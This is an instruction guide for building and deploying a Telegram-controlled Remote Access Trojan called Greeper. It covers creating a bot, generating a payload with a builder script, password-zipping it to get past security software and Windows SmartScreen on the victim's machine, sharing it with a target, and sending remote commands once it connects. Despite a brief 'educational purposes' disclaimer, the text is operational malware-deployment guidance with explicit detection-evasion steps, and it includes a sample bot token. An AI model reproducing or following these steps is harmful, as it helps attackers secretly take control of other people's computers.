This document provides detailed instructions on how to use the Remote Access Trojan (RAT) tool for educational purposes.
Please ensure that you have the necessary permissions and are compliant with all applicable laws before proceeding.

STEP 1: CREATE A TELEGRAM BOT
	i)   Open Telegram:
	ii)  Open BotFather: In the search bar, type @BotFather and select the official BotFather account with blue tick.
	iii) Create a New Bot:
		 Start a chat with BotFather and send the command /newbot.
		 Follow the prompts to name your bot and choose a username (it must end with "bot", e.g., MyTestBot).
	iv)  Obtain Your Bot Token:
		 After creating the bot, BotFather will provide you with a token copy and keep it.
		 It will look like this 8664582844:AAE1WX6XLEQa6WAUcBHmfivpu4Ulv9Ci0W4.
		
STEP 2: GET YOUR USER ID
	i)   Find UserInfoBot: In the Telegram app, search for @userinfobot and start a chat.
	ii)  Retrieve Your User ID:Send any message to the bot, and it will respond with your user ID.
		 This ID is necessary for the RAT tool to send messages to your Telegram account.
		
STEP 3: RUN THE GREEPER_BUILDER
	i)   Run the Greeper_Builder.bat in the Greeper_Builder folder
	ii)  You will see a agreement, accept it to continue
	iii) First the Builder will ask the path of Greeper.py file
	iv)  Now the Builder will ask Bot token and UserID
			REMEMBER ctrl+c is not copy in terminal!
			Just right click to paste.
	v)   After entering the details, the payload will be made and saved in the payload folder in the same dir of Builder
		 You may see some warnings like numpy bla bla bla Just Ignore them like your alarm clock!

STEP 4: FINAL STEPS
	i)   Locate the Payload: it will be saved in a directory specified by the script. Make a note of this location.
	ii)  Compress the Payload: To avoid detection by security software, compress the payload using 7-Zip.
		 Set a password to zip to avoid smartscreen in the victum device.
	iii) Start Your Bot: Before sharing the payload, ensure that you start your bot from your Telegram account at least once.
		 The payload will not work if the bot is started before sending.
		
STEP 5: USING THE PAYLOAD
	i)	 Share the Payload: When the payload is executed on the target machine, it will establish a connection with your Telegram bot.
	ii)	 Interact with the Payload: You can send commands to the payload through your Telegram bot.
		 To get help, send the command /help in the bot chat after the client is online.
		
		
NOTES:

# Send the payload in compressed password protected zip to skip windows smartscreen
# Single Use of Bot Token: Use a bot token for only one payload. If two clients come online with the same bot token, it will result in a crash.
